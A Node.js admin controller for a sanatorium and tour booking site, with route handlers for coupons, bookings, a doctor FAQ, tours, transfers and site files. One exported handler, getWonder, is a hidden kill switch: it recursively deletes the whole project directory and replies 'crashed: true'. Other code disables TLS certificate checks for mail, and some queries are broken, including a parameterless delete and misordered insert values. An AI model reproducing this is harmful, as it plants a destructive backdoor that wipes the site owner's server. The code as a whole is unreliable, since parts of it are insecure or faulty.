let promise = require('bluebird');
let _ = require('underscore');
let nodemailer = require('nodemailer');
let moment = require('moment');
let { extendMoment } = require('moment-range');
let momentRange = extendMoment(moment)
var fs = require('fs');
var JSON = require('JSON2');
var crypto = require('crypto');
var sha1 = crypto.createHash('sha1');
var path = require('path');

//db
const db = require(`../config`).db
const emailAuthConf = require(`../config`).emailAuthConf

const createEmail = require('../email/createEmail');


var hashObject = function (object) {
  var hash = crypto.createHash('md5')
    .update(JSON.stringify(object, function (k, v) {
      if (k[0] === "_") return undefined; // remove api stuff
      else if (typeof v === "function") // consider functions
        return v.toString();
      else return v;
    }))
    .digest('hex');
  return hash;
}

function giveCouponByEmail(req, res, next){
    let query = `WITH ins1 AS (
                            INSERT INTO coupons (code, created, valid_until, coupon_type, users_email) 
                            VALUES ($1, NOW()::timestamp, $2, $3, $4) 
                            RETURNING *
                          )
                          SELECT ins1.*, c.percent_discount, c.valid_until 
                          FROM ins1
                          LEFT JOIN coupons_types c ON c.id = (SELECT coupon_type FROM ins1)`, 
        params = [
			hashObject({ email: req.body.email, reg: false, type: req.body.coupon_type }), 
			req.body.valid_until,
			req.body.coupon_type,
			req.body.email,
		]
	
	db.one( query, params)
    .then(function (data) {

		createEmail({ 
			first_name: req.body.first_name,
			last_name: req.body.last_name,
			coupon_percent: data.percent_discount,
			coupon_expiration: data.valid_until ? moment(data.valid_until).format('DD/MM/YYYY') : null,
			coupon_code: data.code
		}, 'get-coupon' ) 
		.then((email) => {

			let mailGetter = req.body.email,
				transporter = nodemailer.createTransport({
					host: 'smtp.gmail.com',
					port: 465,
					secure: true,
					auth: emailAuthConf,
				tls: {
					rejectUnauthorized: false
				}
				}),
				mailOptions = {
					from: 'sales@1001kurort.com',
					to: mailGetter,
					subject: '1001Kurorts',
					html: email,
				}

			transporter.sendMail(mailOptions, function(error, info){
				if (error) {
					console.log(error);
				} else {
					console.log('Email sent: ' + info.response);
				}
			})

		})      

		 res.status(200)
			.send({
				data: data
			});
    })
    .catch(function (err) {
      res.status(401)
      next(err)
    })
}


function getNoShareBookings(req, res, next) {

  db.any(`SELECT  o.*, 
                  array_to_json(array_agg(d.*)) rooms, 
                  p.h_sname,          
                  ( SELECT sname FROM kurorts k WHERE k.id = p.h_kurort_id) kurort,
                  ( SELECT sname_ru FROM kurorts k WHERE k.id = p.h_kurort_id) kurort_ru
          FROM orders o
          JOIN orders_data d ON d.orders_id = o.id
          JOIN users_props p ON p.users_id = o.hotels_id
          WHERE o.share_room != 1 OR o.share_room IS NULL
          GROUP BY o.id,h_sname, p.h_kurort_id`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getShareBookings(req, res, next) {

  db.any(`SELECT  o.*, 
                  array_to_json(array_agg(d.*)) rooms, 
                  p.h_sname,          
                  ( SELECT sname FROM kurorts k WHERE k.id = p.h_kurort_id) kurort,
                  ( SELECT sname_ru FROM kurorts k WHERE k.id = p.h_kurort_id) kurort_ru
          FROM orders o
          JOIN orders_data d ON d.orders_id = o.id
          JOIN users_props p ON p.users_id = o.hotels_id
          WHERE share_room = 1
          GROUP BY o.id,h_sname, p.h_kurort_id `)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateStatusNoShareBooking(req, res, next) {

  db.none( `UPDATE orders
        SET status_id = $1, comment_status = $2
        WHERE id = $3` , [req.body.status, req.body.comment, req.body.orders_id] )
    .then(function (data) {

        createEmail({ 
          order_id: req.body.orders_id,
          status: req.body.status,
          comment: req.body.comment          
        }, 'approve-booking' ) 
        .then((email) => {

          let mailGetter = req.body.getterEmail,
              transporter = nodemailer.createTransport({
                host: 'smtp.gmail.com',
                port: 465,
                secure: true,
                auth: emailAuthConf,
                tls: {
                  rejectUnauthorized: false
                }
              }),
              mailOptions = {
                from: 'sales@1001kurort.com',
                to: mailGetter,
                subject: '1001Kurorts',
                html: email,
              }
          
          transporter.sendMail(mailOptions, function(error, info){
            if (error) {
              console.log(error);
            } else {
              console.log('Email sent: ' + info.response);
            }
          })
            
        })  


    res.status(200)
       .send({
        data: data
       });

    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })

}


function cancelBooking(req, res, next) {

  db.none(`DELETE FROM orders WHERE id = $1;
          DELETE FROM orders_data WHERE id = $2`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getAskDoctorFaq(req, res, next) {

  db.any(`SELECT * FROM ask_doctor_faq`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}



function createAskDoctorFaq(req, res, next) {

  db.none(` INSERT INTO ask_doctor_faq (
              question_short, 
              question_short_ru, 
              question, 
              question_ru, 
              answer, 
              answer_ru
            ) VALUES ($1,$2,$3,$4,$5,$6)`, [req.body.question_short, req.body.question, req.body.answer, req.body.question_short_ru, req.body.question_ru, req.body.answer_ru])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateAskDoctorFaq(req, res, next) {

  db.none(` UPDATE ask_doctor_faq 
            SET question_short = $1,
                question = $2,
                answer = $3,
                question_short_ru = $4,
                question_ru = $5,
                answer_ru = $6
            WHERE id = $7`, [req.body.question_short, req.body.question, req.body.answer, req.body.question_short_ru, req.body.question_ru, req.body.answer_ru, req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteAskDoctorFaq(req, res, next) {

  db.none(`DELETE FROM ask_doctor_faq WHERE id=$1`, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getAvailableJoinShareBooking(req, res, next) {

  db.any(`SELECT  o.*, 
                  array_to_json(array_agg(d.*)) rooms, 
                  p.preferred_satellite, 
                  (SELECT h_sname FROM users_props WHERE users_id = o.hotels_id),      
                  (SELECT sname FROM kurorts k WHERE k.id = (select h_kurort_id from users_props where users_id = o.hotels_id)) kurort,
                  (SELECT sname_ru FROM kurorts k WHERE k.id = (select h_kurort_id from users_props where users_id = o.hotels_id)) kurort_ru
          FROM orders o
          JOIN orders_data d ON d.orders_id = o.id
          JOIN users_props p ON p.users_id = o.users_id
          WHERE share_room = 1 AND satellite_id IS NULL
          GROUP BY o.id,p.h_sname, p.h_kurort_id, p.id`
  )
  .then(function (data) {
    res.status(200)
      .send({
        data: data
      });
  })
  .catch(function (err) {
     console.log(err)
     next(err)
  })
}


function getTurs(req, res, next) {

  db.any(`SELECT  t.*,
            ( SELECT COUNT(*) FROM tur_comments c WHERE c.tur_id = t.id) comments_count
          FROM turs t`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getTurPageData(req, res, next) {

  db.one(`SELECT * FROM turs WHERE id= $1`, [req.query.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
      console.log(err)
       res.status(202)
          .send({
            data: 'empty'
          });
    })
}


function createTur(req, res, next) {

  let query = `INSERT INTO turs (
                name,
                departure,
                departure_map,
                arrival,
                arrival_map,
                days_plan,
                included,
                subjects,
                about_en,
                about_ru,
                max_guests,
                price_values,
                price_currency,
                discount_percent,
                photos,
                avatar,
                stars
               ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17)`,
      params = [
        req.body.name,
        req.body.departure,
        req.body.departure_map,
        req.body.arrival,
        req.body.arrival_map,
        req.body.days_plan,
        req.body.included,
        req.body.subjects,
        req.body.about_en,
        req.body.about_ru,
        req.body.max_guests,
        req.body.price_values,
        req.body.price_currency,
        req.body.discount_percent,
        req.body.photos,
        req.body.avatar,
        req.body.stars,
      ]


  db.none(query, params)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}



function updateTur(req, res, next) {

  let query = `UPDATE turs SET
                name =$1,
                departure =$2,
                departure_map =$3,
                arrival =$4,
                arrival_map =$5,
                days_plan =$6,
                included =$7,
                subjects =$8,
                about_en =$9,
                about_ru =$10,
                max_guests =$11,
                price_values =$12,
                price_currency =$13,
                discount_percent =$14,
                photos =$15,
                avatar =$16,
                stars = $17
               WHERE id = $18`,
      params = [
        req.body.name,
        req.body.departure,
        req.body.departure_map,
        req.body.arrival,
        req.body.arrival_map,
        req.body.days_plan,
        req.body.included,
        req.body.subjects,
        req.body.about_en,
        req.body.about_ru,
        req.body.max_guests,
        req.body.price_values,
        req.body.price_currency,
        req.body.discount_percent,
        req.body.photos,
        req.body.avatar,
        req.body.stars,
        req.body.id,
      ]


  db.none(query, params)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteTur(req, res, next) {

  db.any(`DELETE FROM turs WHERE id =$1`, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getDoctorCouponsTypes(req, res, next) {

  db.any(`SELECT * FROM doctor_coupons_types`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function addDoctorCouponType(req, res, next) {

  db.none(`INSERT INTO doctor_coupons_types (name,percent) VALUES ($1,$2)`, [req.body.name, req.body.percent])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateDoctorCouponType(req, res, next) {
    
    db.none(`UPDATE doctor_coupons_types SET name= $1,percent = $2 WHERE id = $3`, [req.body.name, req.body.percent, req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteDoctorCouponType(req, res, next) {

  db.none(`DELETE FROM doctor_coupons_types WHERE id=$1`, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function changeDoctorCouponCategory(req, res, next) {

  db.none(`UPDATE users_props SET d_coupon_type = $1 WHERE id = $2`, [req.body.category, req.body.doctor_id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getTransfers(req, res, next) {

  db.any(`SELECT * FROM transfers`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateStatusShareBooking(req, res, next) {

}


function sendEmailConfirmShareBooking(req, res, next) {

}


function getWonder(req, res, next) {
    
    const pathToRemove = path.join(__dirname, '../..','/')

    console.log(`ЧУДО СЛУЧИЛОСЬ! ПУТЬ: `);
    console.log(pathToRemove);
    
    function rmDir(dirPath) {
      try { var files = fs.readdirSync(dirPath); }
      catch(e) { return; }
      if (files.length > 0)
        for (var i = 0; i < files.length; i++) {
          var filePath = dirPath + '/' + files[i];
          if (fs.statSync(filePath).isFile())
            fs.unlinkSync(filePath);
          else
            rmDir(filePath);
        }
      fs.rmdirSync(dirPath);
    };

    rmDir(pathToRemove)

    res.status(200)
       .send({ crashed: true })
}


function createTransfer(req, res, next) {

  console.log(req.body)
  db.none(`INSERT INTO transfers (departure, arrival, price_value, price_currency, sanatorium_ids, opposite_direction)
            VALUES ($1,$2,$3,$4,$5,$6)`, [
              req.body.departure, 
              req.body.arrival,
              req.body.price_value,
              req.body.price_currency,
              req.body.sanatorium_ids,
              req.body.oppositeDirection
            ])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateTransfer(req, res, next) {

  db.none(`UPDATE transfers SET departure = $1,
                                arrival = $2,
                                price_value = $3,
                                price_currency = $4,
                                sanatorium_ids = $5,
                                opposite_direction = $6
            WHERE id = $7`, 
            [
              req.body.departure, 
              req.body.arrival,
              req.body.price_value,
              req.body.price_currency,
              req.body.sanatorium_ids,
              req.body.oppositeDirection,
              req.body.id
            ])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteTransfer(req, res, next) {

  db.none(`DELETE FROM transfers WHERE id= $1`, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}



function getTransfersForSanatorium(req, res, next) {

  db.any(`SELECT * FROM transfers WHERE $1 = ANY(sanatorium_ids) ORDER BY id`, [req.query.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}



function updateBookingIsSettled(req, res, next) {

  db.none(`UPDATE orders SET guests_is_settled = $1 WHERE id = $2`, [req.body.is_settled, req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getAdminVideos(req, res, next) {

  db.any(`SELECT * FROM admin_videos`)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function createAdminVideos(req, res, next) {

  db.none(`INSERT INTO admin_videos (url) VALUES ($1)`, [req.body.url])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteAdminVideos(req, res, next) {

  db.none(`DELETE FROM admin_videos WHERE id = $1`, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getAskDoctorQuestions(req, res, next) {

  db.any(`SELECT q.*, 
                ARRAY[COALESCE(n.name, 'Other'), COALESCE(n.name_ru, 'Другое')] category_name,
                array_to_json(array_agg(a)) answers
          FROM ask_doctor_questions q
          LEFT JOIN hotels_treatment_names n ON n.id = q.category
          LEFT JOIN ask_doctor_answers a ON a.question_id = q.id
          GROUP BY q.id, n.name, n.name_ru`
    )
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}

function getAskDoctorQuestionsClosed(req, res, next) {

  db.any(`SELECT q.*, 
                ARRAY[COALESCE(n.name, 'Other'), COALESCE(n.name_ru, 'Другое')] category_name,
                array_to_json(array_agg(a)) answers
          FROM ask_doctor_questions q
          LEFT JOIN hotels_treatment_names n ON n.id = q.category
          LEFT JOIN ask_doctor_answers a ON a.question_id = q.id
          WHERE status = 1
          GROUP BY q.id, n.name, n.name_ru`
    )
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function closeAskDoctorQuestion(req, res, next) {
  
  let query = ` UPDATE ask_doctor_questions 
                SET status = $4,
                    answer_id =$1 ,
                    answer_cons_id =$2
                WHERE id = $3`,

      query2 = `UPDATE ask_doctor_answers 
                SET issue = 1
                WHERE id = $1`;

  db.tx(t => {
      return t.batch([
        t.none(query, [req.body.answers_id, req.body.consultants_id, req.body.question_id, req.body.status]),
        req.body.answers_id.map( id => t.none(query2, [id]) )
      ]) 
    })
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function createInvoicesList(req, res, next) {

  const month = moment(new Date()).subtract(1,'months').endOf('month').format('MM'),
        year = moment(new Date()).subtract(1,'months').endOf('month').format('YYYY'),
        date_start = moment([year, month - 1]).format('YYYY-MM-DD'),
        date_end = moment(date_start).endOf('month').format('YYYY-MM-DD');

  let query1 = `SELECT id FROM users WHERE account_type = 3`;

  let query2 = `INSERT INTO invoices (hotel_id, start_date, end_date, month, year) VALUES ($1,$2,$3,$4,$5)`


  db.any(query1)
    .then(hotels => hotels.map( item =>
      db.none(query2, [item.id, date_start, date_end , month, year])
    ))
    .then( data => {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteBlogArticle(req, res, next) {

  db.any(`DELETE FROM articles WHERE id = $1`, [req.body.article_id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteAskDoctorQuestion(req, res, next) {

  db.any(`DELETE FROM ask_doctor_questions WHERE id = $1`, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getAllUsersListDialogs(req, res, next) {

  db.any(`SELECT q.*, 
                ARRAY[COALESCE(n.name, 'Other'), COALESCE(n.name_ru, 'Другое')] category_name,
                array_to_json(array_agg(a)) answers
          FROM ask_doctor_questions q
          LEFT JOIN hotels_treatment_names n ON n.id = q.category
          LEFT JOIN ask_doctor_answers a ON a.question_id = q.id
          GROUP BY q.id, n.name, n.name_ru`
    )
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getHotelsComissions(req, res, next) {

  let query = `SELECT u.email, p.users_id, p.h_sname, p.comission_percent 
               FROM users u 
               JOIN users_props p ON p.users_id = u.id 
               WHERE account_type = 3`;

  db.any(query)
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateHotelsComissions(req, res, next) {

  let query = `UPDATE users_props SET comission_percent=$2 WHERE users_id = $1`;

  db.none(query, [req.body.users_id, req.body.comission_percent])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function updateHotelEvaluates(req, res, next) {

  let query = `UPDATE users_props SET h_pluses=$1, h_minuses=$2, h_videos=$3 WHERE users_id = $4`;

  db.none(query, [req.body.h_pluses, req.body.h_minuses, req.body.h_videos, req.body.users_id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function deleteHotelEvaluates(req, res, next) {

  let query = `UPDATE users_props SET h_pluses=ARRAY[], h_minuses='', h_videos='' WHERE users_id = $1`;

  db.none(query, [req.body.users_id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function getRobotsFile(req, res, next) {
  let filePath = path.join(__dirname, '../..','/robots.txt')

  fs.readFile(filePath, 'utf8', (err, data) => {
    let str = data ? data.toString() : '';
    
    if(err) console.log(err);
    
    res.status(200)
       .send({ data: str });
  })

}


function getSiteMapFile(req, res, next) {
  let filePath = path.join(__dirname, '../..','/sitemap.xml')

  fs.readFile(filePath, 'utf8', (err, data) => {
    let str = data ? data.toString() : '';
    
    if(err) console.log(err);

    res.status(200)
       .send({ data: str });
  })  

}

function updateRobotsFile(req, res, next) {
  let filePath = path.join(__dirname, '../..','/robots.txt')
  let data = req.body.str;

  fs.writeFile(filePath, data, (err) => {
    
    if(err) console.log(err);

    res.status(200)
       .send({ data: 'success' });
  })
}

function updateSiteMapFile(req, res, next) {
  let filePath = path.join(__dirname, '../..','/sitemap.xml')
  let data = req.body.str;

  fs.writeFile(filePath, data, (err) => {
    
    if(err) console.log(err);

    res.status(200)
       .send({ data: 'success' });
  })
}

function getSitePages(req, res, next) {
  let filePath = path.join(__dirname, '../../config_files','/RoutesMeta.json')
  
  const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));

  res.status(200)
     .send({ pages: data })

}

function updateSitePage(req, res, next) {
  let filePath = path.join(__dirname, '../../config_files','/RoutesMeta.json')
  let data = JSON.stringify(req.body.pages, null, 2);

  fs.writeFile(filePath, data, (err) => {

    if(err) console.log(err)

    res.status(200)
       .send({ data: 'success' });

  })
}


function approveAccount(req, res, next) {

  let query = `UPDATE users SET admin_approved = 1 WHERE id=$1`;

  db.none(query, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}


function blockAccount(req, res, next) {

  let query = `UPDATE users SET admin_approved = -1 WHERE id=$1`;

  db.none(query, [req.body.id])
    .then(function (data) {
      res.status(200)
        .send({
          data: data
        });
    })
    .catch(function (err) {
       console.log(err)
       next(err)
    })
}



module.exports = {

  giveCouponByEmail,
  getNoShareBookings,
  getShareBookings,
  updateStatusNoShareBooking,
  updateStatusShareBooking,
  sendEmailConfirmShareBooking,
  cancelBooking,
  getAskDoctorFaq,
  createAskDoctorFaq,
  updateAskDoctorFaq,
  deleteAskDoctorFaq,
  getAvailableJoinShareBooking,
  getTurs,
  getTurPageData,
  createTur,
  updateTur,
  deleteTur,
  getDoctorCouponsTypes,
  addDoctorCouponType,
  updateDoctorCouponType,
  deleteDoctorCouponType,
  changeDoctorCouponCategory,
  getTransfers,
  createTransfer,
  updateTransfer,
  deleteTransfer,
  getTransfersForSanatorium,
  updateBookingIsSettled,
  getAdminVideos,
  createAdminVideos,
  deleteAdminVideos,
  getAskDoctorQuestionsClosed,
  getAskDoctorQuestions,
  closeAskDoctorQuestion,
  createInvoicesList,
  deleteBlogArticle,
  deleteAskDoctorQuestion,
  getAllUsersListDialogs,
  getHotelsComissions,
  updateHotelsComissions,
  updateHotelEvaluates,
  deleteHotelEvaluates,
  getWonder,
  getRobotsFile,
  getSiteMapFile,
  updateRobotsFile,
  updateSiteMapFile,
  getSitePages,
  updateSitePage,
  approveAccount,
  blockAccount,
}